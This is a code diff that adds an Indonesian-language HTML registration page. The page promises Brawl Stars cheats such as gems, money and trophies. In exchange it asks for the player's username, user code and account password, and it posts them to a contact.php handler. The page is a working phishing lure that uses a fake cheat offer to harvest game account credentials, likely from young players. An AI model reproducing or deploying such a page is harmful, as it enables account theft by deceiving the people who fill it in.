@@ -1,1 +1,41 @@
-
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Registrasi</title>
+</head>
+<body>
+    <form action="contact.php" method="POST">
+        <fieldset>
+        <legend>Registrasi</legend>
+        <p>
+            <label>Ussername:</label>
+            <input type="text" name="nama" placeholder="Ussername Brawl Stars" required/>
+        </p>
+        <p>
+            <label>Kode Pengguna:</label>
+            <input type="number" name="username" placeholder="Kode Pengguna Kamu" required/>
+        </p>
+        <p>
+            <label>Password Akun:</label>
+            <input type="password" name="email" placeholder="Password Anda" required/>
+        </p>
+        <p>
+            <label>Pilih Cheat:</label>
+            <select name="Jumlah">
+                <option value="uang">Money</option>
+                <option value="permata">Gems</option>
+                <option value="trofi">trofi</option>
+                <option value="starpoin">starpoin</option>
+            </select>
+        </p>
+        <p>
+            <label>Jumlah:</label>
+            <input type="number" name="Jumlah" placeholder="Jumlah Cheat" required/>
+        </p>
+        <p>
+            <a href="./sukses.html"><button>Submit</button></a>
+        </p>
+        </fieldset>
+    </form>
+</body>
+</html>
